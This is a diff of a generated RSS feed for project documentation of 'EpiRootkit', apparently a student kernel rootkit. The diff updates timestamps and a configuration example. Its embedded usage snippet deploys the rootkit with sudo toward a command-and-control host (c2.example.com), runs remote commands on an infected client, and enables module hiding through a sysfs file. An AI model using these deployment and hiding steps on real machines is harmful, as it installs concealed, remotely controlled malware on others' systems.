@@ -1,4 +1,4 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>EpiRootkit on Tux Fan Club Docs</title><link>/docs/05-epirootkit/</link><description>Recent content in EpiRootkit on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sat, 07 Jun 2025 20:21:40 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/index.xml" rel="self" type="application/rss+xml"/><item><title>Configuration Justifications</title><link>/docs/05-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/configuration-justifications/</guid><description>&lt;h2 id="target-environment">Target Environment &lt;a href="#target-environment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>EpiRootkit on Tux Fan Club Docs</title><link>/docs/05-epirootkit/</link><description>Recent content in EpiRootkit on Tux Fan Club Docs</description><generator>Hugo</generator><language>en</language><lastBuildDate>Sat, 07 Jun 2025 21:56:13 +0200</lastBuildDate><atom:link href="/docs/05-epirootkit/index.xml" rel="self" type="application/rss+xml"/><item><title>Configuration Justifications</title><link>/docs/05-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/05-epirootkit/configuration-justifications/</guid><description>&lt;h2 id="target-environment">Target Environment &lt;a href="#target-environment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
 &lt;li>&lt;strong>OS&lt;/strong>: Ubuntu 20.04 LTS (Focal Fossa)&lt;/li>
 &lt;li>&lt;strong>Kernel&lt;/strong>: 5.4.0-26-generic&lt;/li>
 &lt;/ul>
@@ -57,7 +57,7 @@
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="c341f58" class="language-bash ">
+ &lt;pre id="5097043" class="language-bash ">
  &lt;code># 1. Build and deploy with XOR encryption enabled
 cd rootkit &amp;amp;&amp;amp; make
 sudo ./deploy_rootkit.sh address=c2.example.com port=443
@@ -76,9 +76,9 @@ exec Client-1 whoami
 status Client-1
 # EpiRootkit Status: Version 1.0.0, Module Hidden: YES, Encryption: XOR
 
-# 4. Configure via sysfs (octal permissions style)
-sudo sh -c &amp;#39;echo 7 &amp;gt; /sys/kernel/epirootkit/hide&amp;#39; # Enable all hiding
-cat /sys/kernel/epirootkit/hide # Check: 7&lt;/code>
+# 4. Configure via permission bits (feature toggles)
+sudo chmod 607 /sys/kernel/epirootkit/control # rwx = all features enabled
+cat /sys/kernel/epirootkit/control # Check status&lt;/code>
  &lt;/pre>
  &lt;/div>
 &lt;h2 id="architecture">Architecture &lt;a href="#architecture" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;h3 id="core-components">Core Components &lt;a href="#core-components" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h3>&lt;ul>
